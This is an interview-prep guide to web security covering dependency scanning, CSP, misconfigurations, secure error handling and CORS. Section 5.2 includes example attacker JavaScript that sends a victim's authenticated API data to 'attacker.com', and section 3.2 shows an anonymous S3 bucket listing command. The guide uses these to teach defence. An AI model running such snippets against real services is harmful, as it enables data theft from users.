# 🔐 Advanced Web & App Security  
**Dependency Scanning, CSP, Misconfigurations & Secure Error Handling**

This document covers **critical security practices** for **modern applications** — focusing on **proactive threat prevention**, **secure defaults**, and **real-world attack mitigation**.

Each section includes:
- ✅ Clear definition
- ✅ In-depth explanation
- ✅ Real-world examples
- ✅ Best practices
- ✅ Interview-ready answers

---

## 1. What is dependency scanning? How do you check for vulnerable packages?

> **Dependency scanning** is the process of **identifying third-party libraries** used in your application and **checking them for known security vulnerabilities**.

It’s essential because **you inherit the risks of every library you use**.

---

### 🔹 1.1 Why It Matters

- 80%+ of app code is **open-source dependencies**
- Vulnerabilities like **Log4Shell (CVE-2021-44228)** can be exploited remotely
- Attackers scan for apps using vulnerable versions

---

### 🔹 1.2 Tools for Dependency Scanning

| Tool | Ecosystem | Type |
|------|---------|------|
| **OWASP Dependency-Check** | Multi-language | SCA (Software Composition Analysis) |
| **Snyk** | JS, Java, Python, .NET | SCA + Fix guidance |
| **GitHub Dependabot** | GitHub repos | Built-in alerts & PRs |
| **npm audit** | Node.js | CLI tool |
| **pip-audit** | Python | CLI |
| **Sonatype Nexus IQ** | Enterprise | Advanced policy enforcement |

---

### 🔹 1.3 Example: Snyk Scan (JavaScript)

```bash
# Install Snyk
npm install -g snyk

# Test for vulnerabilities
snyk test

# Output:
# ✗ High severity vulnerability found in axios < 0.21.1
#   Description: Server-Side Request Forgery (SSRF)
#   Info: https://snyk.io/vuln/SNYK-JS-AXIOS-1579261
```

✅ Snyk tells you:
- Which package is vulnerable
- Severity
- CVE ID
- Fix version

---

### 🔹 1.4 Best Practices

| Practice | How |
|--------|-----|
| ✅ **Scan on every CI/CD build** | Fail build if high-severity issue |
| ✅ **Automate updates** | Use Dependabot or Renovate |
| ✅ **Use lock files** | `package-lock.json`, `pom.xml`, `requirements.txt` |
| ✅ **Audit dependencies manually** | Review new libraries before adding |
| ✅ **Minimize dependencies** | Less code = fewer risks |

---

### 📌 Interview Answer

> _"I use dependency scanning tools like Snyk or Dependabot to detect vulnerable packages in my dependencies. I run scans in CI/CD and fail the build on high-severity issues. I keep dependencies updated and minimize their number. This prevents attacks like Log4Shell, where a single vulnerable library can compromise the entire system."_  

---

## 2. What is CSP (Content Security Policy)? How does it mitigate XSS?

> **CSP (Content Security Policy)** is an **HTTP response header** that **restricts which sources of content** (scripts, styles, images) can be loaded by the browser.

It’s one of the **most effective defenses against XSS**.

---

### 🔹 2.1 How CSP Works

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'
```

✅ This tells the browser:
- Load resources only from the same origin (`'self'`)
- Allow scripts from `https://trusted-cdn.com`
- Block `<object>`, `<embed>`, `<applet>` (`'none'`)

---

### 🔹 2.2 Example: Preventing Inline XSS

❌ Without CSP:
```html
<!-- Attacker injects -->
<script>stealCookies()</script>
```

✅ With CSP:
```http
Content-Security-Policy: script-src 'self'
```

❌ Browser **blocks** inline scripts → XSS fails.

---

### 🔹 2.3 Key Directives

| Directive | Purpose |
|---------|--------|
| `default-src` | Fallback for other directives |
| `script-src` | Where scripts can be loaded from |
| `style-src` | Trusted CSS sources |
| `img-src` | Allowed image origins |
| `connect-src` | AJAX, WebSockets |
| `frame-ancestors` | Prevents clickjacking (replaces `X-Frame-Options`) |
| `object-src` | Blocks Flash, Java applets |

---

### 🔹 2.4 Best Practices

| Rule | Why |
|------|-----|
| ✅ **Start with `default-src 'self'`** | Only allow same-origin |
| ✅ **Avoid `'unsafe-inline'` and `'unsafe-eval'`** | Defeats XSS protection |
| ✅ **Use nonces or hashes for safe inline scripts** | If you must use inline |
| ✅ **Report violations** | Use `report-uri` or `report-to` |
| ✅ **Test in report-only mode first** | `Content-Security-Policy-Report-Only` |

---

### 📌 Interview Answer

> _"CSP is an HTTP header that tells the browser which sources of content are trusted. It prevents XSS by blocking inline scripts and external scripts from untrusted domains. I use `script-src 'self'` to allow only my domain, and avoid `'unsafe-inline'`. I also use nonce-based scripts for dynamic content. It’s a powerful, browser-enforced defense."_  

---

## 3. What is security misconfiguration? Give examples.

> **Security misconfiguration** is the **most common vulnerability** — it happens when **security settings are not properly defined or enabled**.

It’s often **low effort, high reward** for attackers.

---

### 🔹 3.1 Common Examples

| Misconfiguration | Risk |
|------------------|------|
| ❌ **Default credentials** | `admin:admin` on admin panel → full access |
| ❌ **Verbose error messages** | Stack traces leak server details |
| ❌ **Unnecessary services enabled** | FTP, Telnet, debug endpoints |
| ❌ **Directory listing enabled** | Browse `/uploads/` → find sensitive files |
| ❌ **Missing security headers** | No CSP, HSTS, X-Frame-Options |
| ❌ **Insecure HTTP instead of HTTPS** | Data intercepted |
| ❌ **Open S3 buckets** | Publicly readable/writable |
| ❌ **Debug mode in production** | `/actuator/env` exposes secrets |

---

### 🔹 3.2 Real-World Example: Open S3 Bucket

```bash
# Misconfigured S3 bucket
aws s3 ls s3://customer-data-backup --no-sign-request
# Lists all files → attacker downloads user database
```

✅ Fix: Set `Block Public Access` and use bucket policies.

---

### 🔹 3.3 Prevention

| Strategy | How |
|--------|-----|
| ✅ **Hardened baseline** | Use security templates (AWS Security Hub, CIS Benchmarks) |
| ✅ **Automated scanning** | Check for open ports, buckets, debug endpoints |
| ✅ **Least privilege** | Disable unused services |
| ✅ **Regular audits** | Penetration testing, config reviews |
| ✅ **Environment parity** | Dev and prod should have same security settings |

---

### 📌 Interview Answer

> _"Security misconfiguration is when security settings are missing or weak — like default passwords, open S3 buckets, or verbose errors. I prevent it by using hardened baselines, automated scanning, and regular audits. I never enable debug mode in production and always disable directory listing. It’s the most common vulnerability — so I treat it as a top priority."_  

---

## 4. What is secure error handling? Why should you avoid detailed error messages?

> **Secure error handling** means **providing minimal, user-friendly messages** to clients while **logging full details securely** on the server.

---

### 🔹 4.1 Bad: Detailed Error Messages

```json
{
  "error": "Internal Server Error",
  "message": "NullPointerException in UserService.java:45",
  "stackTrace": "at com.app.UserService.findById(UserService.java:45) ..."
}
```

❌ Risks:
- Leaks **file names, line numbers, server structure**
- Helps attackers **map attack surface**
- Reveals **technology stack** (Java, Spring, etc.)

---

### 🔹 4.2 Good: Secure Error Response

```json
{
  "error": "Internal Error",
  "code": "INTERNAL_ERROR",
  "requestId": "req-abc123"
}
```

✅ Then log full error **on server**:
```log
ERROR req-abc123 - NullPointerException in UserService.findById: User ID null
```

---

### 🔹 4.3 Best Practices

| Rule | How |
|------|-----|
| ✅ **Never expose stack traces** | Use generic messages |
| ✅ **Log full details server-side** | Include `requestId` for correlation |
| ✅ **Use error codes** | For client logic (e.g., `USER_NOT_FOUND`) |
| ✅ **Include requestId in logs and responses** | For debugging |
| ✅ **Don’t reveal system details** | No DB names, OS, framework versions |

---

### 📌 Interview Answer

> _"Secure error handling means returning generic messages to users — like 'Internal Error' — while logging full details server-side with a requestId. I never expose stack traces or file names — they help attackers. Instead, I use error codes and log everything internally for debugging. This balances usability and security."_  

---

## 5. What is CORS misconfiguration? How can it lead to security issues?

> **CORS (Cross-Origin Resource Sharing)** is a **security mechanism**, but **misconfiguration can create serious vulnerabilities**.

---

### 🔹 5.1 Common Misconfigurations

| Misconfiguration | Risk |
|------------------|------|
| ❌ `Access-Control-Allow-Origin: *` with `Allow-Credentials: true` | **Critical**: Any site can read authenticated API responses |
| ❌ `Access-Control-Allow-Origin: null` | Bypassed via `file://` or sandboxed iframe |
| ❌ Overly broad `Allow-Methods` | Allows `DELETE`, `PUT` from any origin |
| ❌ Missing `Vary: Origin` | Cache poisoning risk |

---

### 🔹 5.2 Critical Example: Wildcard + Credentials

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

✅ **This is a major vulnerability** — it allows **any website** to make authenticated requests and **read the response**.

❌ Attacker site:
```javascript
fetch('https://yourbank.com/api/balance', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  fetch('https://attacker.com/steal?balance=' + data.balance);
});
```

✅ Steals user’s balance because browser sends cookies.

---

### 🔹 5.3 Secure Configuration

```http
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Vary: Origin
```

✅ Only allow **specific, trusted origins** — never `*` with credentials.

---

### 📌 Interview Answer

> _"CORS misconfiguration happens when policies are too permissive — like allowing all origins with credentials. This lets any site read authenticated API responses. I always specify exact origins, never use `*` with `Allow-Credentials`, and set `Vary: Origin`. I test CORS settings with tools like Postman or Burp Suite to ensure they’re tight."_  

---

## ✅ Final Tip

> 🎯 In interviews, **combine defenses**:
> _"I scan dependencies for vulnerabilities, enforce CSP to block XSS, prevent misconfigurations with automated checks, handle errors securely, and configure CORS safely."_  

That shows **defense-in-depth thinking** — exactly what senior roles want.
